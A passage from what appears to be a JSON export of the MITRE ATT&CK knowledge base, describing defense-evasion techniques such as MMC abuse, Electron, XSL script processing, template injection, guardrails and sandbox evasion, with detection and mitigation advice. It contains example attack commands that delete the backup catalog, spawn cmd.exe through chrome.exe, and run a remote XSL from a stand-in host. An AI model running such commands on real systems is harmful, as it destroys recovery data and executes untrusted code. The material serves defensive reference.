href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mmc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win_mmc)</a> <a href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/what-is-microsoft-management-console\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: what_is_mmc)</a> MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration. <a href=\"https://www.ghacks.net/2017/06/10/windows-msc-files-overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win_msc_files_overview)</a>\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode. <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mmc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win_mmc)</a> Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems). <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-catalog\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win_wbadmin_delete_catalog)</a> <a href=\"https://www.virustotal.com/gui/file/0b4c743246478a6a8c9fa3ff8e04f297507c2f0ea5d61a1284fe65387d172f81/detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: phobos_virustotal)</a>\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. <a href=\"https://docs.microsoft.com/en-us/windows/win32/com/clsid-key-hklm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win_clsid_key)</a> Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey. <a href=\"https://research.checkpoint.com/2019/microsoft-management-console-mmc-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mmc_vulns)</a> Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>. <a href=\"https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: abusing_com_reg)</a>","detection":"Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. \n\nMonitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as <code>services.msc</code> or <code>eventvwr.msc</code>. Invoking non-Microsoft .msc files may be an indicator of malicious activity.","platforms":["Windows"],"dataSources":["Command: Command Execution","File: File Creation","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of MMC if it is not required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"MMC may not be necessary within a given environment since it is primarily used by system administrators, not regular users or clients."}]},{"id":"T1218.015","name":"Electron Applications","description":"Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. <a href=\"https://www.first.org/resources/papers/conf2023/FIRSTCON23-TLP-CLEAR-Horejsi-Abusing-Electron-Based-Applications-in-Targeted-Attacks.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron 2)</a> Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. <a href=\"https://www.kaspersky.com/blog/electron-framework-security-issues/49035/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron 3)</a> The Chromium engine is used to display web content and Node.js runs the backend code. <a href=\"https://www.mend.io/blog/theres-a-new-stealer-variant-in-town-and-its-using-electron-to-stay-fully-undetected/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron 1)</a>\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. <a href=\"https://www.mend.io/blog/theres-a-new-stealer-variant-in-town-and-its-using-electron-to-stay-fully-undetected/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron 1)</a> For example, the abuse of <code>teams.exe</code> and <code>chrome.exe</code> may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., <code>chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe</code>). <a href=\"https://medium.com/@MalFuzzer/one-electron-to-rule-them-all-dc2e9b263daf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron 6-8)</a>\n\nAdversaries may also execute malicious content by planting malicious JavaScript within Electron applications. <a href=\"https://www.electronjs.org/docs/latest/tutorial/using-native-node-modules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron Security)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Where possible, enforce binary and application integrity with digital signature verification to prevent untrusted code from executing. For example, do not use <code>shell.openExternal</code> with untrusted content.\n\nWhere possible, set <code>nodeIntegration</code> to false, which disables access to the Node.js function. <a href=\"https://medium.com/certik/vulnerability-in-electron-based-application-unintentionally-giving-malicious-code-room-to-run-e2e1447d01b8\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron Security 3)</a> By disabling access to the Node.js function, this may limit the ability to execute malicious commands by injecting JavaScript code.\n\nDo not disable <code>webSecurity</code>, which may allow for users of the application to invoke malicious content from online sources."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove or deny access to unnecessary and potentially vulnerable software and features to prevent abuse by adversaries. Many native binaries may not be necessary within a given environment: for example, consider disabling the Node.js integration in all renderers that display remote content to protect users by limiting adversaries’ power to plant malicious JavaScript within Electron applications. <a href=\"https://stackoverflow.com/questions/48854265/why-do-i-see-an-electron-security-warning-after-updating-my-electron-project-t\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Electron Security 2)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using trusted binaries to bypass application control. \nEnsure that Electron is updated to the latest version and critical vulnerabilities (such as nodeIntegration bypasses) are patched and cannot be exploited."}]}]},{"id":"T1220","name":"XSL Script Processing","description":"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. <a href=\"https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft XSLT Script Mar 2017)</a>\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) <a href=\"https://www.microsoft.com/download/details.aspx?id=21714\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft msxsl.exe)</a> can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. <a href=\"https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Penetration Testing Lab MSXSL July 2017)</a> Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. <a href=\"https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Reaqta MSXSL Spearphishing MAR 2018)</a> Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension. <a href=\"https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: XSL Bypass Mar 2019)</a>\n\nCommand-line examples: <a href=\"https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Penetration Testing Lab MSXSL July 2017)</a> <a href=\"https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: XSL Bypass Mar 2019)</a>\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Wmic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Wmic)</a> This technique can also execute local/remote scripts and, similar to its Regsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch. <a href=\"https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: XSL Bypass Mar 2019)</a>\n\nCommand-line examples: <a href=\"https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: XSL Bypass Mar 2019)</a> <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Wmic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Wmic)</a>\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>","detection":"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Wmic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Wmic)</a> <a href=\"https://x.com/dez_/status/986614411711442944\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter SquiblyTwo Detection APR 2018)</a> Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.","platforms":["Windows"],"dataSources":["Module: Module Load","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries."}],"subTechniques":[]},{"id":"T1221","name":"Template Injection","description":"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. <a href=\"https://docs.microsoft.com/previous-versions/office/developer/office-2007/aa338205(v=office.12)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Open XML July 2017)</a>\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. <a href=\"https://www.sans.org/reading-room/whitepapers/testing/template-injection-attacks-bypassing-security-controls-living-land-38780\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Brian Wiltse Template Injection)</a> These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. <a href=\"http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Redxorblue Remote Template Injection)</a> Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/10/decoy-microsoft-word-document-delivers-malware-through-rat/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes Template Injection OCT 2017)</a>\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/injection-new-black-novel-rtf-template-inject-technique-poised-widespread\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint RTF Injection)</a> <a href=\"https://ciberseguridad.blog/decodificando-ficheros-rtf-maliciosos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ciberseguridad Decoding malicious RTF files)</a>\n\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. <a href=\"https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Template Injection MAR 2018)</a> <a href=\"https://blog.talosintelligence.com/2017/07/template-injection.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Template Injection July 2017)</a> <a href=\"https://github.com/ryhanson/phishery\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ryhanson phishery SEPT 2016)</a>","detection":"Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: PowerShell), or other suspicious actions that could relate to post-compromise behavior.\n\nMonitor .rtf files for strings indicating the <code>&amp;#42;\\template</code> control word has been modified to retrieve a URL resource, such as <code>&amp;#42;\\template http</code> or <code>&amp;#42;\\template \\u-</code>.","platforms":["Windows"],"dataSources":["Network Traffic: Network Connection Creation","Process: Process Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to identify social engineering techniques and spearphishing emails that could be used to deliver malicious documents."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network/Host intrusion prevention systems, antivirus, and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads. <a href=\"https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Template Injection MAR 2018)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling Microsoft Office macros/active content to prevent the execution of malicious payloads in documents <a href=\"https://support.office.com/article/enable-or-disable-macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable Macros)</a>, though this setting may not mitigate the Forced Authentication use for this technique."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Network/Host intrusion prevention systems, antivirus, and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads. <a href=\"https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Template Injection MAR 2018)</a>"}],"subTechniques":[]},{"id":"T1480","name":"Execution Guardrails","description":"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. <a href=\"https://www.cyberscoop.com/kevin-mandia-fireeye-u-s-malware-nice/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Kevin Mandia Guardrails)</a> Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses. <a href=\"https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Outlook Dec 2019)</a>\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\n\nAdversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems. <a href=\"https://www.trellix.com/blogs/research/qakbot-evolves-to-onenote-malware-distribution/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trellix-Qakbot)</a>","detection":"Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1055","name":"Do Not Mitigate","description":"Execution Guardrails likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised."}],"subTechniques":[{"id":"T1480.001","name":"Environmental Keying","description":"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment. <a href=\"https://www.schneier.com/academic/paperfiles/paper-clueless-agents.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EK Clueless Agents)</a>\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Gauss Whitepaper)</a> <a href=\"https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint Router Malvertising)</a> <a href=\"https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EK Impeding Malware Analysis)</a> <a href=\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Environmental Keyed HTA)</a> By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Gauss Whitepaper)</a> These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to Obfuscated Files or Information, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Gauss Whitepaper)</a> <a href=\"https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EK Impeding Malware Analysis)</a> <a href=\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Environmental Keyed HTA)</a> <a href=\"https://github.com/nccgroup/demiguise/blob/master/examples/virginkey.js\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demiguise Guardrail Router Logo)</a> By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Gauss Whitepaper)</a> This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other Execution Guardrails, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.","detection":"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","Windows","macOS"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1055","name":"Do Not Mitigate","description":"Environmental Keying likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised via confusion of keys by the adversary. Mitigation of this technique is also unlikely to be feasible within most contexts because there are no standard attributes from which an adversary may derive keys. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised."}]},{"id":"T1480.002","name":"Mutual Exclusion","description":"Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time. <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/threading/mutexes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Mutexes)</a>\n\nWhile local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes. <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/threading/mutexes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Mutexes)</a> By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised. <a href=\"https://www.sans.org/blog/looking-at-mutex-objects-for-malware-discovery-indicators-of-compromise/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sans Mutexes 2012)</a>\n\nIn Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself. <a href=\"https://intezer.com/blog/malware-analysis/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer RedXOR 2021)</a> <a href=\"https://www.deepinstinct.com/blog/bpfdoor-malware-evolves-stealthy-sniffing-backdoor-ups-its-game\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deep Instinct BPFDoor 2023)</a>\n\nMutex names may be hard-coded or dynamically generated using a predictable algorithm. <a href=\"https://isc.sans.edu/diary/How+Malware+Generates+Mutex+Names+to+Evade+Detection/19429/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ICS Mutexes 2015)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","File: File Creation"],"mitigations":[{"id":"M1055","name":"Do Not Mitigate","description":"Execution Guardrails likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised."}]}]},{"id":"T1497","name":"Virtualization/Sandbox Evasion","description":"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. <a href=\"https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc/edit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deloitte Environment Awareness)</a>\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox. <a href=\"https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Pirpi July 2015)</a>","detection":"Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution"],"mitigations":[],"subTechniques":[{"id":"T1497.001","name":"System Checks","description":"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. <a href=\"https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc/edit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deloitte Environment Awareness)</a>\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as <code>malware</code>, <code>sample</code>, or <code>hash</code>.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. <a href=\"https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: McAfee Virtual Jan 2017)</a> In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices. <a href=\"https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 OilRig Sept 2018)</a>","detection":"Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Process: OS API Execution"],"mitigations":[]},{"id":"T1497.002","name":"User Activity Based Checks","description":"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. <a href=\"https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc/edit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Deloitte Environment Awareness)</a>\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks <a href=\"https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667\" target=\"_blank\" 